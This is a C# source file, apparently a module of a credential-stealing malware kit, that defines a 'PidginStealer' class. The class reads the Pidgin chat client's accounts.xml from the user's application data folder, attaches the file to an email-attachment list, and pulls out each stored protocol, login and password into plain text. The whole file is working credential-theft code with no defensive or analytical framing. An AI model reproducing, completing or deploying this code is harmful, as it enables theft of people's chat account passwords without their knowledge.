#region Imports

using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Mail;
using System.Text.RegularExpressions;
using sub.Util.Misc;

#endregion

namespace sub.Stealers
{
    internal class PidginStealer : IStealer
    {
        private string _name = "PidginKeyStealer";

        #region IStealer Members

        public List<Attachment> Attachments { get; set; }

        public string Name
        {
            get { return _name; }
            set { _name = value; }
        }

        public string Data { get; set; }

        public void Collect()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                          @"\.purple\accounts.xml";
            if (!File.Exists(path)) return;
            Attachments = new List<Attachment> {new Attachment(path)};

            StreamReader reader = File.OpenText(path);
            string accountData = reader.ReadToEnd();
            reader.Close();
            Data = "";
            MatchCollection matchs =
                new Regex("<protocol>(.*?)</password>",
                          RegexOptions.Singleline).Matches(accountData);
            for (int i = 0; i < matchs.Count; i++)
            {
                Data += matchs[i].Value.Replace("\t\t", "")
                    .Replace("<protocol>", "Protocol: ")
                    .Replace("</protocol>", "")
                    .Replace("<name>", "Login: ")
                    .Replace("</name>", "")
                    .Replace("<password>", "Password: ")
                    .Replace("</password>", "") 
                    + "\r\n\r\n";
            }
        }

        #endregion
    }
}